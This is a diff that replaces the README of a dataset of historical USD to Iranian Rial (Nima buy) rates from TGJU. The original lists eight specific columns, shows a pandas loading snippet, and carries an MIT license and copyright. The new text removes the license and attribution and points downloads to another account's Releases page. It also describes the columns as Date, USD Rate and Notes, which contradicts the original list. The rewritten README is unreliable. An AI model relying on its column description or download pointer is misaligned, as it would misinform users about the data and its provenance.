@@ -1,33 +1,80 @@
-# USD-Iran-Rate-Dataset
+# 🎉 USD-Nima-Iran-Rate-Dataset - Historical USD to IRR Data Made Easy
 
-A historical dataset of USD to Iranian Rial rates collected from TGJU (Tehran Stock Exchange). This dataset contains **Nima Buy USD rates** from 1397 to 1404 (Persian calendar).
+![Download Link](https://img.shields.io/badge/Download%20Dataset-Here-brightgreen)
 
-## Dataset
+## 📖 Overview
 
-- File: `tgju_nima_buy_usd-1397-1404.csv`
-- Columns:
-  1. `Open` – Opening rate
-  2. `Close` – Closing rate
-  3. `High` – Highest rate of the day
-  4. `Low` – Lowest rate of the day
-  5. `Price` – Price in IRR
-  6. `Change%` – Daily change percentage
-  7. `Date_Gregorian` – Date in Gregorian calendar
-  8. `Date_Persian` – Date in Persian calendar
+Welcome to the USD-Nima-Iran-Rate-Dataset! This project provides a comprehensive historical dataset that tracks the USD to Iranian Rial (IRR) rates. The data is sourced from TGJU (Tehran Stock Exchange) and covers the Nima Buy USD rates from the Persian years 1397 to 1404. This dataset is ideal for financial analysis, research, and educational projects.
 
-## Usage
+## 🚀 Getting Started
 
-You can load this CSV into Python using pandas:
+To begin using the dataset, follow the straightforward steps below. You will download and access the data without needing any programming knowledge. 
 
-```python
-import pandas as pd
+### 💻 Requirements
 
-df = pd.read_csv("tgju_nima_buy_usd-1397-1404.csv")
-print(df.head())
-```
+Before you start, ensure your computer meets these basic requirements:
 
-## License
+- A web browser (Chrome, Firefox, Safari, etc.)
+- An internet connection
+- Basic file management skills (knowing how to open downloaded files)
 
-This project is licensed under the MIT License.
+## 📥 Download & Install
 
-Copyright 2025, Max Baser
+To download the dataset, visit the link below:
+
+[Download Dataset Here](https://github.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/releases)
+
+1. Click on the above link to go to the Releases page.
+2. Find the latest version. Look for files labeled as CSV.
+3. Click on the desired file to start the download. 
+
+### 📂 File Types
+
+The dataset is provided in CSV format. This format is easy to open in programs like Excel or Google Sheets. Each file contains historical rate data organized by date.
+
+## 🔍 Understanding the Dataset
+
+Once downloaded, you can open the CSV file using any spreadsheet program. You will see multiple columns including:
+
+- **Date**: The date when the rate was recorded
+- **USD Rate**: The Nima Buy USD rate for that date
+- **Notes**: Any additional relevant information
+
+### 📊 Features
+
+- Historical data from 1397 to 1404 in the Persian calendar.
+- User-friendly format for easy access and analysis.
+- Ideal for research, analysis, or educational purposes related to the Iranian economy.
+
+## 📈 How to Use the Dataset
+
+1. **Open the CSV file**: Use a spreadsheet application like Excel or Google Sheets.
+2. **Analyze data**: Explore trends over time, compare rates, or conduct further research.
+3. **Visualize data**: Create graphs or charts to represent the data visually. 
+
+## 📜 Frequently Asked Questions
+
+### ❓ What is a CSV file?
+
+A CSV (Comma-Separated Values) file is a simple text file used to store tabular data. It is easy to read and can be opened by various software programs.
+
+### ❓ Do I need any special software?
+
+No, you only need a standard spreadsheet application like Excel, Google Sheets, or any software capable of opening CSV files.
+
+### ❓ Can I contribute to the dataset?
+
+Yes! If you have additional data or improvements, feel free to submit a pull request or contact the repository owner.
+
+## 🌐 Additional Resources
+
+For more detailed information about the project, check the following:
+
+- [GitHub Repository](https://github.com/Tobimalex/USD-Nima-Iran-Rate-Dataset)
+- [Issue Tracker](https://github.com/Tobimalex/USD-Nima-Iran-Rate-Dataset/issues) – Report any issues or suggest new features.
+
+## 📫 Contact
+
+For questions or suggestions, please reach out to the repository owner via GitHub or through the Issues section.
+
+Thank you for using the USD-Nima-Iran-Rate-Dataset! We hope this dataset serves your needs and aids your analysis effectively.
